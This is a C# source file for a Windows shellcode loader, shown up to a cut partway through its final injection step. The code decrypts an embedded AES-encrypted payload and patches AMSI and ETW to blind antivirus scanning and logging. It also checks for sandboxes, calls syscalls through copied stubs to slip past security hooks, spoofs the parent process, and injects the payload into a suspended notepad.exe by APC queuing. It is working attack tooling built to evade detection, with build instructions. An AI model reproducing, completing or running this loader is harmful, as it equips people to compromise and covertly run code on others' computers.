using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

/*
 * Evasive AES-256-CBC Shellcode Loader
 *
 *   1. PPID spoofing now uses STARTUPINFOEX correctly:
 *        - si.cb = sizeof(STARTUPINFOEX) (112) instead of sizeof(STARTUPINFO) (104)
 *        - attribute list pointer goes into STARTUPINFOEX.lpAttributeList (offset 104),
 *          NOT si.lpReserved2/cbReserved2 (kernel32 reads offset 104 when
 *          EXTENDED_STARTUPINFO_PRESENT is set; stuffing lpReserved2 made
 *          CreateProcessW fail with ERROR_INVALID_PARAMETER / 0xC0000142)
 *        - UpdateProcThreadAttribute now receives a POINTER TO the parent handle
 *          (Marshal.WriteIntPtr(buf, hParent)), not the handle value
 *   2. Every failure path logs to console instead of silently returning.
 *   3. GetSyscallStub: on failure (hooked ntdll / pattern mismatch) the loader
 *      falls back to direct ntdll P/Invoke instead of crashing on
 *      Marshal.GetDelegateForFunctionPointer(IntPtr.Zero).
 *   4. NtProtectVirtualMemory NTSTATUS is checked (RW->RX failure = DEP crash).
 *   5. NtWriteVirtualMemory BufferLength/BytesWritten are IntPtr (SIZE_T), fixing
 *      an 8-byte write into a 4-byte out slot (stack corruption).
 *   6. --skip-sandbox CLI flag to bypass the sandbox/debugger check for testing.
 *   7. Runtime x64 check (x86 build cannot run the x64 payload / stubs).
 *
 *
 * Build:
 *   mcs -platform:x64 -optimize+ -out:Loader.exe Loader.cs
 *   (or csc /target:exe /out:Loader.exe /platform:x64 /optimize+ Loader.cs)
 *
 * Test:
 *   Loader.exe --skip-sandbox
 */

namespace EvasiveLoader
{
    class Program
    {
        // ─────────────────────────────────────────────
        // EMBEDDED ENCRYPTED SHELLCODE + AES KEY / IV
        // ─────────────────────────────────────────────
        private static readonly byte[] EncryptedPayload = new byte[512] {
                0xF2, 0x6E, 0x40, 0xFA, 0xF6, 0xB3, 0x16, 0x7A, 0x7B, 0x6C, 0xBA, 0x99, 0x40, 0xF5, 0x9D, 0x5E,
                0x8C, 0xE3, 0x93, 0x17, 0xF4, 0xF4, 0xAC, 0x8C, 0x89, 0x6F, 0x4A, 0xAD, 0x53, 0x4B, 0x80, 0x0A,
                0x72, 0x65, 0x73, 0x42, 0xA8, 0xFA, 0x45, 0xF0, 0xB1, 0xC7, 0x05, 0x4C, 0xDE, 0x60, 0x74, 0xEF,
                0xA7, 0x0C, 0xAF, 0xED, 0xB9, 0x65, 0x1B, 0xFC, 0xD8, 0x3D, 0x85, 0x91, 0x20, 0x48, 0x45, 0x1C,
                0x8C, 0xF5, 0x1D, 0xDF, 0x9D, 0xD4, 0x1A, 0x58, 0x4B, 0x54, 0x40, 0xDB, 0x39, 0x10, 0x34, 0x1D,
                0xF1, 0x85, 0x4D, 0x9D, 0x80, 0x95, 0x57, 0x72, 0xDC, 0x9D, 0x64, 0x6A, 0x3E, 0x3F, 0x64, 0xD4,
                0x7D, 0x68, 0x45, 0x8C, 0x0E, 0xC8, 0x2A, 0x66, 0x06, 0x43, 0x08, 0x61, 0x9F, 0x65, 0xB2, 0x81,
                0xF4, 0x48, 0x35, 0x70, 0x2E, 0x2F, 0x69, 0xBE, 0xD3, 0x8F, 0x81, 0xC9, 0x6C, 0x9C, 0x59, 0xD7,
                0xE6, 0x74, 0xDD, 0x9A, 0x3C, 0x0D, 0x33, 0x81, 0x11, 0x8B, 0xCF, 0xD5, 0x51, 0xF2, 0x5C, 0x15,
                0x58, 0xFA, 0x17, 0x40, 0x92, 0x21, 0xA3, 0x68, 0x33, 0x9B, 0xE5, 0x1F, 0xCF, 0xFC, 0x88, 0x6C,
                0xC0, 0x6A, 0xDF, 0xFE, 0xDC, 0x09, 0x0D, 0x1B, 0x79, 0x67, 0xB3, 0xA6, 0x48, 0x65, 0x44, 0x11,
                0xC1, 0x7B, 0xC3, 0xEE, 0xFC, 0x6C, 0x18, 0x43, 0xE7, 0x5D, 0x6C, 0xBE, 0x75, 0x8E, 0xB9, 0x85,
                0x63, 0xDF, 0x5E, 0xDC, 0x9E, 0x1B, 0xB7, 0x62, 0xB2, 0x98, 0x78, 0xDA, 0x29, 0x9A, 0x36, 0x4D,
                0x32, 0xAE, 0xAE, 0x0B, 0x2E, 0x71, 0xFF, 0x6F, 0x91, 0x03, 0x71, 0x8F, 0xA1, 0xAA, 0x2B, 0x09,
                0x88, 0xDF, 0x28, 0xA7, 0x05, 0x03, 0xDC, 0xAE, 0x45, 0x7F, 0xA4, 0xBB, 0x40, 0x29, 0x87, 0xAD,
                0x49, 0x7B, 0x0E, 0xD6, 0x4C, 0x44, 0x6A, 0xBB, 0x76, 0x4A, 0x4B, 0x45, 0x31, 0x54, 0x36, 0xBD,
                0xA5, 0xAC, 0x54, 0xE9, 0xDA, 0x15, 0xCD, 0x4E, 0x7F, 0xF0, 0x04, 0x5C, 0x9C, 0xDA, 0x5A, 0x00,
                0xB6, 0x3F, 0xA9, 0x43, 0x9D, 0xAB, 0x63, 0xE6, 0x34, 0x90, 0xB4, 0xD7, 0xD1, 0xF0, 0x10, 0xAF,
                0x51, 0x79, 0xAF, 0xC6, 0xDF, 0x8D, 0x90, 0xB8, 0xD0, 0x48, 0x9C, 0xB0, 0x33, 0x0C, 0x45, 0xCA,
                0x8E, 0xDE, 0x03, 0x23, 0xCA, 0x2E, 0x75, 0x81, 0x5E, 0x15, 0x57, 0xAE, 0x28, 0x56, 0x22, 0x70,
                0x4E, 0x6C, 0x78, 0xA2, 0x63, 0xBF, 0x3C, 0xF4, 0x78, 0xAF, 0xE1, 0x0F, 0xFD, 0x33, 0x50, 0x68,
                0x59, 0xEC, 0x54, 0x5A, 0x2C, 0x99, 0xCB, 0x25, 0x89, 0x18, 0x74, 0xAA, 0x40, 0xA6, 0xB7, 0xDA,
                0xD6, 0xDD, 0x85, 0x9F, 0x4C, 0x50, 0xEC, 0xFA, 0x25, 0xC1, 0x62, 0x5F, 0x98, 0xDD, 0x47, 0x82,
                0x28, 0xE0, 0x65, 0x17, 0x81, 0x1B, 0x09, 0xCB, 0xB3, 0x51, 0x9B, 0x6C, 0x14, 0x45, 0xD0, 0x8E,
                0x9E, 0x30, 0x3E, 0x7A, 0xAF, 0xAF, 0x18, 0xA6, 0x07, 0x67, 0x36, 0x80, 0x1F, 0x1C, 0x6C, 0xBD,
                0xDD, 0xCB, 0xFC, 0xBD, 0x2F, 0xCA, 0xBB, 0x13, 0x55, 0xF1, 0x91, 0x56, 0x52, 0x61, 0x39, 0x4B,
                0xD5, 0xAD, 0x25, 0x69, 0x5B, 0xC4, 0x2B, 0x12, 0xA9, 0xDC, 0x4B, 0xA4, 0x2A, 0x3C, 0x7E, 0x8D,
                0xA5, 0x45, 0x78, 0x77, 0x64, 0x6F, 0x92, 0x49, 0x78, 0x0E, 0xB5, 0xE5, 0x8A, 0x0C, 0xD2, 0x75,
                0xD9, 0x5B, 0xE2, 0x7C, 0xD0, 0x3E, 0x49, 0xFB, 0x70, 0x59, 0x6D, 0x40, 0x7C, 0x31, 0xEF, 0xD7,
                0x96, 0x1E, 0x1D, 0x8D, 0x24, 0xF8, 0x8E, 0x36, 0x3F, 0x40, 0xA1, 0xC9, 0xC6, 0x22, 0xDA, 0x93,
                0x71, 0x1B, 0x59, 0xE8, 0x64, 0x20, 0x72, 0x39, 0x46, 0x33, 0xC0, 0x2B, 0x16, 0x06, 0x7F, 0xF8,
                0x52, 0x4B, 0x48, 0x44, 0xFC, 0x3C, 0xB6, 0x1F, 0x95, 0x73, 0xE2, 0xD1, 0xD0, 0x62, 0x46, 0x88
        };

        private static readonly byte[] AesKey = new byte[32] {
                0x23, 0x90, 0xD9, 0xF7, 0xE8, 0xE8, 0x0A, 0xAA, 0x3E, 0xEF, 0xC6, 0x4C, 0x6E, 0x24, 0x4A, 0xB0,
                0x5F, 0xA3, 0x71, 0xD3, 0xA9, 0x7C, 0x9A, 0x2E, 0x28, 0xC6, 0xE4, 0x89, 0x43, 0x24, 0x3A, 0x6B
        };

        private static readonly byte[] AesIv = new byte[16] {
                0x44, 0xFA, 0xC5, 0x12, 0x20, 0xD5, 0x3D, 0x25, 0xF0, 0x44, 0xE4, 0x9C, 0x06, 0x6C, 0x19, 0xED
        };

        // ─────────────────────────────────────────────
        // LOGGING
        // ─────────────────────────────────────────────
        private static void Log(string msg)
        {
            Console.WriteLine(msg);
        }

        // ─────────────────────────────────────────────
        // AES DECRYPTION
        // ─────────────────────────────────────────────
        private static byte[] AesDecrypt(byte[] ciphertext, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                ICryptoTransform decryptor = aes.CreateDecryptor();
                return decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
            }
        }

        // ─────────────────────────────────────────────
        // PINVOKE / STRUCTS
        // ─────────────────────────────────────────────
        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        // STARTUPINFOEX = STARTUPINFO (104 bytes on x64) + lpAttributeList at offset 104
        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [Flags]
        enum ProcessAccessFlags : uint
        {
            PROCESS_CREATE_PROCESS = 0x0080,
        }

        [Flags]
        enum AllocationType : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
        }

        [Flags]
        enum MemoryProtection : uint
        {
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }

        const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint CREATE_SUSPENDED = 0x00000004;

        // ─────────────────────────────────────────────
        // STANDARD PINVOKE FOR SETUP
        // ─────────────────────────────────────────────
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, uint dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessW(string lpApplicationName, StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern bool IsDebuggerPresent();

        // ─────────────────────────────────────────────
        // DIRECT NTDLL PINVOKE (FALLBACK when syscall stub
        // resolution fails, e.g. hooked/patched ntdll)
        // ─────────────────────────────────────────────
        [DllImport("ntdll.dll")]
        static extern uint NtAllocateVirtualMemoryFallback(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [DllImport("ntdll.dll")]
        static extern uint NtWriteVirtualMemoryFallback(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, IntPtr BufferLength, out IntPtr BytesWritten);

        [DllImport("ntdll.dll")]
        static extern uint NtProtectVirtualMemoryFallback(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll")]
        static extern uint NtQueueApcThreadFallback(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);

        [DllImport("ntdll.dll")]
        static extern uint NtResumeThreadFallback(IntPtr ThreadHandle, out uint SuspendCount);

        // ─────────────────────────────────────────────
        // INDIRECT SYSCALL DELEGATES
        // ─────────────────────────────────────────────
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate uint NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate uint NtWriteVirtualMemoryDelegate(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, IntPtr BufferLength, out IntPtr BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate uint NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate uint NtQueueApcThreadDelegate(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate uint NtResumeThreadDelegate(IntPtr ThreadHandle, out uint SuspendCount);

        // ─────────────────────────────────────────────
        // SYSCALL STUB RESOLVER
        // ─────────────────────────────────────────────
        private static IntPtr GetSyscallStub(string functionName)
        {
            // Copy the syscall stub (mov r10, rcx; mov eax, <SSN>; syscall; ret)
            // from ntdll into executable memory to bypass userland hooks.
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            if (ntdll == IntPtr.Zero)
            {
                Log("[!] GetSyscallStub: ntdll.dll not loaded?");
                return IntPtr.Zero;
            }

            IntPtr funcAddr = GetProcAddress(ntdll, functionName);
            if (funcAddr == IntPtr.Zero)
            {
                Log("[!] GetSyscallStub: " + functionName + " not found in ntdll.");
                return IntPtr.Zero;
            }

            byte[] stub = new byte[24];
            Marshal.Copy(funcAddr, stub, 0, stub.Length);

            // Verify x64 syscall stub pattern:
            //   mov r10, rcx  = 4C 8B D1
            //   mov eax, SSN  = B8 XX XX XX XX
            if (stub[0] != 0x4C || stub[1] != 0x8B || stub[2] != 0xD1 || stub[3] != 0xB8)
            {
                Log("[!] GetSyscallStub: " + functionName + " does not match x64 stub pattern (hooked/patched ntdll?) - using fallback.");
                return IntPtr.Zero;
            }

            IntPtr stubAddr = VirtualAllocEx((IntPtr)(-1), IntPtr.Zero, (uint)stub.Length,
                AllocationType.MEM_COMMIT | AllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
            if (stubAddr == IntPtr.Zero)
            {
                Log("[!] GetSyscallStub: VirtualAllocEx failed (win32 error " + Marshal.GetLastWin32Error() + ").");
                return IntPtr.Zero;
            }

            byte[] fullStub = new byte[stub.Length + 1];
            Array.Copy(stub, fullStub, stub.Length);
            fullStub[stub.Length] = 0xC3; // ret

            Marshal.Copy(fullStub, 0, stubAddr, fullStub.Length);

            uint old;
            VirtualProtect(stubAddr, (UIntPtr)fullStub.Length, (uint)MemoryProtection.PAGE_EXECUTE_READ, out old);

            Log("[*] Syscall stub " + functionName + " @ 0x" + stubAddr.ToString("X") + " (RX).");
            return stubAddr;
        }

        // ─────────────────────────────────────────────
        // AMSI PATCH
        // ─────────────────────────────────────────────
        private static void PatchAmsi()
        {
            IntPtr amsi = GetModuleHandle("amsi.dll");
            if (amsi == IntPtr.Zero)
            {
                Log("[*] AMSI patch: amsi.dll not loaded in this process - skipping.");
                return;
            }

            IntPtr amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
            if (amsiScanBuffer == IntPtr.Zero)
            {
                Log("[*] AMSI patch: AmsiScanBuffer not found - skipping.");
                return;
            }

            byte[] patch = Environment.Is64BitProcess
                ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }                 // mov eax, 0x80070057; ret
                : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };    // mov eax, 0x80070057; ret 0x18

            uint old;
            VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, (uint)MemoryProtection.PAGE_EXECUTE_READWRITE, out old);
            Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);
            VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, old, out _);
            Log("[+] AMSI patched (AmsiScanBuffer @ 0x" + amsiScanBuffer.ToString("X") + ").");
        }

        // ─────────────────────────────────────────────
        // ETW PATCH
        // ─────────────────────────────────────────────
        private static void PatchEtw()
        {
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            if (ntdll == IntPtr.Zero)
            {
                Log("[*] ETW patch: ntdll.dll not loaded?");
                return;
            }

            IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
            if (etwEventWrite == IntPtr.Zero)
            {
                Log("[*] ETW patch: EtwEventWrite not found - skipping.");
                return;
            }

            byte[] patch = Environment.Is64BitProcess
                ? new byte[] { 0xC3 }               // ret
                : new byte[] { 0xC2, 0x14, 0x00 };  // ret 0x14

            uint old;
            VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, (uint)MemoryProtection.PAGE_EXECUTE_READWRITE, out old);
            Marshal.Copy(patch, 0, etwEventWrite, patch.Length);
            VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, old, out _);
            Log("[+] ETW patched (EtwEventWrite @ 0x" + etwEventWrite.ToString("X") + ").");
        }

        // ─────────────────────────────────────────────
        // SANDBOX EVASION
        // ─────────────────────────────────────────────
        private static bool SandboxDetected()
        {
            if (IsDebuggerPresent())
            {
                Log("[!] Sandbox check: IsDebuggerPresent() == true.");
                return true;
            }

            long tickStart = Environment.TickCount;
            Sleep(2000);
            long elapsed = Environment.TickCount - tickStart;
            if (elapsed < 1500)
            {
                Log("[!] Sandbox check: sleep accelerated (" + elapsed + "ms < 1500ms).");
                return true;
            }
            Log("[*] Sandbox check: sleep timing OK (" + elapsed + "ms).");

            string[] artifacts = { @"C:\agent\agent.pyw", @"C:\sandbox", @"C:\cuckoo" };
            foreach (string path in artifacts)
            {
                if (System.IO.File.Exists(path) || System.IO.Directory.Exists(path))
                {
                    Log("[!] Sandbox check: artifact found: " + path);
                    return true;
                }
            }

            return false;
        }

        // ─────────────────────────────────────────────
        // MAIN ENTRY POINT
        // ─────────────────────────────────────────────
        static void Main(string[] args)
        {
            Log("[*] Loader started.");

            // ---- ARCHITECTURE CHECK ----
            if (!Environment.Is64BitProcess)
            {
                Log("[!] This loader must run as an x64 process (x64 payload + x64 syscall stubs). Rebuild with /platform:x64 and run the x64 binary.");
                return;
            }

            // ---- SANDBOX CHECK ----
            bool skipSandbox = Array.Exists(args, a => a == "--skip-sandbox" || a == "-s");
            if (skipSandbox)
            {
                Log("[*] Sandbox check skipped (--skip-sandbox).");
            }
            else if (SandboxDetected())
            {
                Log("[!] Sandbox/debugger detected - exiting.");
                return;
            }
            else
            {
                Log("[*] Sandbox check passed.");
            }

            // ---- PATCH AMSI & ETW ----
            PatchAmsi();
            PatchEtw();

            // ---- DECRYPT SHELLCODE ----
            byte[] shellcode;
            try
            {
                shellcode = AesDecrypt(EncryptedPayload, AesKey, AesIv);
            }
            catch (Exception ex)
            {
                Log("[!] AES decryption failed: " + ex.Message);
                return;
            }

            if (shellcode == null || shellcode.Length == 0)
            {
                Log("[!] Decrypted payload is empty.");
                return;
            }
            Log("[+] Decrypted " + shellcode.Length + " bytes.");

            // ---- RESOLVE SYSCALL STUBS (fall back to P/Invoke per-function) ----
            IntPtr stubNtAllocate = GetSyscallStub("NtAllocateVirtualMemory");
            IntPtr stubNtWrite = GetSyscallStub("NtWriteVirtualMemory");
            IntPtr stubNtProtect = GetSyscallStub("NtProtectVirtualMemory");
            IntPtr stubNtQueueApc = GetSyscallStub("NtQueueApcThread");
            IntPtr stubNtResume = GetSyscallStub("NtResumeThread");

            int resolved = (stubNtAllocate != IntPtr.Zero ? 1 : 0) + (stubNtWrite != IntPtr.Zero ? 1 : 0) + (stubNtProtect != IntPtr.Zero ? 1 : 0) + (stubNtQueueApc != IntPtr.Zero ? 1 : 0) + (stubNtResume != IntPtr.Zero ? 1 : 0);
            Log("[*] Syscall stubs resolved: " + resolved + "/5 (unresolved ones fall back to direct ntdll P/Invoke).");

            NtAllocateVirtualMemoryDelegate NtAllocateVirtualMemory = stubNtAllocate != IntPtr.Zero
                ? Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemoryDelegate>(stubNtAllocate)
                : (NtAllocateVirtualMemoryDelegate)NtAllocateVirtualMemoryFallback;

            NtWriteVirtualMemoryDelegate NtWriteVirtualMemory = stubNtWrite != IntPtr.Zero
                ? Marshal.GetDelegateForFunctionPointer<NtWriteVirtualMemoryDelegate>(stubNtWrite)
                : (NtWriteVirtualMemoryDelegate)NtWriteVirtualMemoryFallback;

            NtProtectVirtualMemoryDelegate NtProtectVirtualMemory = stubNtProtect != IntPtr.Zero
                ? Marshal.GetDelegateForFunctionPointer<NtProtectVirtualMemoryDelegate>(stubNtProtect)
                : (NtProtectVirtualMemoryDelegate)NtProtectVirtualMemoryFallback;

            NtQueueApcThreadDelegate NtQueueApcThread = stubNtQueueApc != IntPtr.Zero
                ? Marshal.GetDelegateForFunctionPointer<NtQueueApcThreadDelegate>(stubNtQueueApc)
                : (NtQueueApcThreadDelegate)NtQueueApcThreadFallback;

            NtResumeThreadDelegate NtResumeThread = stubNtResume != IntPtr.Zero
                ? Marshal.GetDelegateForFunctionPointer<NtResumeThreadDelegate>(stubNtResume)
                : (NtResumeThreadDelegate)NtResumeThreadFallback;

            // ---- SPAWN TARGET PROCESS WITH PPID SPOOFING (EARLY-BIRD APC) ----
            string targetProcess = @"C:\Windows\System32\notepad.exe";

            STARTUPINFOEX siEx = new STARTUPINFOEX();
            siEx.StartupInfo.cb = (uint)Marshal.SizeOf<STARTUPINFOEX>(); // 112 bytes on x64 - required when using the attribute list
            PROCESS_INFORMATION pi;

            uint creationFlags = CREATE_SUSPENDED;
            IntPtr hParent = IntPtr.Zero;
            IntPtr lpAttributeList = IntPtr.Zero;

            // ---- PPID SPOOFING SETUP ----
            try
            {
                Process[] explorers = Process.GetProcessesByName("explorer");
                if (explorers.Length > 0)
                {
                    hParent = OpenProcess(ProcessAccessFlags.PROCESS_CREATE_PROCESS, false, (uint)explorers[0].Id);
                    if (hParent == IntPtr.Zero)
                    {
                        Log("[!] OpenProcess(explorer pid=" + explorers[0].Id + ") failed: win32 error " + Marshal.GetLastWin32Error() + " - continuing WITHOUT PPID spoofing.");
                    }
                    else
                    {
                        Log("[+] Opened explorer.exe pid=" + explorers[0].Id + " as spoofed parent.");
                    }
                }
                else
                {
                    Log("[!] explorer.exe not found - continuing WITHOUT PPID spoofing.");
                }

                if (hParent != IntPtr.Zero)
                {
                    IntPtr lpSize = IntPtr.Zero;
                    if (!InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize))
                    {
                        Log("[!] InitializeProcThreadAttributeList(size query) failed: win32 error " + Marshal.GetLastWin32Error() + " - continuing WITHOUT PPID spoofing.");
                    }
                    else
                    {
                        lpAttributeList = Marshal.AllocHGlobal(lpSize);
                        if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref lpSize))
                        {
                            Log("[!] InitializeProcThreadAttributeList(alloc) failed: win32 error " + Marshal.GetLastWin32Error() + " - continuing WITHOUT PPID spoofing.");
                            Marshal.FreeHGlobal(lpAttributeList);
                            lpAttributeList = IntPtr.Zero;
                        }
                        else
                        {
                            
                            IntPtr pParent = Marshal.AllocHGlobal(IntPtr.Size);
                            Marshal.WriteIntPtr(pParent, hParent);

                            bool ok = UpdateProcThreadAttribute(lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, pParent, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                            Marshal.FreeHGlobal(pParent);

                            if (!ok)
                            {
                                Log("[!] UpdateProcThreadAttribute failed: win32 error " + Marshal.GetLastWin32Error() + " - continuing WITHOUT PPID spoofing.");
                                DeleteProcThreadAttributeList(lpAttributeList);
                                Marshal.FreeHGlobal(lpAttributeList);
                                lpAttributeList = IntPtr.Zero;
                            }
                            else
                            {
                                Log("[+] Parent-process attribute queued.");
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Log("[!] PPID setup exception: " + ex.Message + " - continuing WITHOUT PPID spoofing.");
                if (lpAttributeList != IntPtr.Zero)
                {
                    DeleteProcThreadAttributeList(lpAttributeList);
                    Marshal.FreeHGlobal(lpAttributeList);
                    lpAttributeList = IntPtr.Zero;
                }
            }

            if (lpAttributeList != IntPtr.Zero)
            {
                siEx.lpAttributeList = lpAttributeList; 
                creationFlags |= EXTENDED_STARTUPINFO_PRESENT;
            }

            // ---- CREATE PROCESS ----
            StringBuilder cmdline = new StringBuilder(targetProcess);
            bool created = CreateProcessW(null, cmdline, IntPtr.Zero, IntPtr.Zero, false, creationFlags, IntPtr.Zero, null, ref siEx, out pi);

            if (lpAttributeList != IntPtr.Zero)
            {
                DeleteProcThreadAttributeList(lpAttributeList);
                Marshal.FreeHGlobal(lpAttributeList);
            }
            if (hParent != IntPtr.Zero)
            {
                CloseHandle(hParent);
            }

            if (!created)
            {
                int err = Marshal.GetLastWin32Error();
                Log("[!] CreateProcessW failed: win32 error " + err + " (0x" + err.ToString("X8") + ").");
                Log("[*] If this is 0xC0000142 / ERROR_INVALID_PARAMETER the STARTUPINFOEX usage is wrong; see siEx.cb=" + siEx.StartupInfo.cb + ", lpAttributeList=0x" + siEx.lpAttributeList.ToString("X") + ".");
                return;
            }
            Log("[+] CreateProcessW OK: notepad.exe pid=" + pi.dwProcessId + " (suspended).");

            // ---- INJECT SHELLCODE VIA SYSCALLS ----
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            // Step 1: Allocate RW memory in target
            uint status = NtAllocateVirtualMemory(pi.hProcess, ref baseAddr, IntPtr.Zero, ref regionSize, (uint)(AllocationType.MEM_COMMIT | AllocationType.MEM_RESERVE), (uint)MemoryProtection.PAGE_READWRITE);
            if (status != 0)
            {
                Log("[!] NtAllocateVirtualMemory failed: NTSTATUS 0x" + status.ToString("X8"));
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }
            Log("[+] Allocated " + regionSize + " bytes @ 0x" + baseAddr.ToString("X") + " (RW).");

            // Step 2: Write shellcode
            IntPtr shellcodePtr = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, shellcodePtr, shellcode.Length);

            IntPtr bytesWritten;
            status = NtWriteVirtualMemory(pi.hProcess, baseAddr, shellcodePtr, (IntPtr)shellcode.Length, out bytesWritten);

            Marshal.FreeHGlobal(shellcodePtr);

            if (status != 0)
            {
                Log("[!] NtWriteVirtualMemory failed: NTSTATUS 0x" + status.ToString("X8"));
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }
            Log("[+] Wrote " + bytesWritten + " bytes.");

            // Step 3: Change to RX
            IntPtr protectAddr = baseAddr;
            IntPtr protectSize = (IntPtr)shellcode.Length;
            uint oldProtect;
            status = NtProtectVirtualMemory(pi.hProcess, ref protectAddr, ref protectSize, (uint)MemoryProtection.PAGE_EXECUTE_READ, out oldProtect);
            if (status != 0)
            {
                Log("[!] NtProtectVirtualMemory failed: NTSTATUS 0x" + status.ToString("X8") + " - payload will not execute (DEP).");
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }
            Log("[+] Region 0x" + baseAddr.ToString("X") + " changed to PAGE_EXECUTE_READ.");

            // Step 4: Queue APC to the suspended main thread
            status = NtQueueApcThread(pi.hThread, baseAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (status != 0)
            {
                Log("[!] NtQueueApcThread failed: NTSTATUS 0x" + status.ToString("X8"));
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }
            Log("[+] APC queued to thread " + pi.dwThreadId + ".");

            // Step 5: Resume thread - APC fires immediately
            uint suspendCount;
            status = NtResumeThread(pi.hThread, out suspendCount);
            if (status != 0)
            {
